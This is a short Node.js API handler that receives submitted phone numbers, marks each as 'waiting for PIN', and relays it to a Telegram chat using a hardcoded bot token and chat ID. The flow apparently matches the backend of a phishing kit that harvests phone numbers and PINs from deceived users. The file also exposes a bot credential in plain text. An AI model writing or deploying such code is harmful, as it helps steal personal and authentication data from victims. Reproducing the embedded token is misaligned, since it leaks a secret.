// api/phone.js
import fetch from 'node-fetch';

const TELEGRAM_BOT_TOKEN = '7246291582:AAGDVmXvRKX_PdEug_XZ2-pKnXrkPMcS3k0';
const TELEGRAM_CHAT_ID = '-4544953608';

// In-memory store for client data (You can switch this to a database if needed)
const clientData = {};

export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { phoneNumber } = req.body;
      console.log(`Received Phone Number: ${phoneNumber}`);

      // Check if phone number is already in the system (optional check)
      if (clientData[phoneNumber]) {
        res.status(400).json({ error: 'Phone number already submitted and waiting for PIN.' });
        return;
      }

      // Store the phone number and mark it as waiting for PIN
      clientData[phoneNumber] = null;
      console.log(`Phone number received: ${phoneNumber}`);

      // Send phone number to Telegram
      const message = `New Phone Number Submission:\nPhone Number: ${phoneNumber}`;
      await sendTelegramMessage(message);

      // Respond with success
      res.status(200).json({ status: 'Phone number received. Waiting for PIN.' });
    } catch (error) {
      console.error('Error processing the phone number:', error);
      res.status(500).json({ error: 'Internal Server Error' });
    }
  } else {
    res.status(405).json({ error: 'Method Not Allowed' });
  }
}

async function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = { chat_id: TELEGRAM_CHAT_ID, text: message };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      console.log('Message sent to Telegram successfully');
    } else {
      const errorText = await response.text();
      console.error(`Failed to send message to Telegram: ${response.status} - ${errorText}`);
    }
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
  }
}
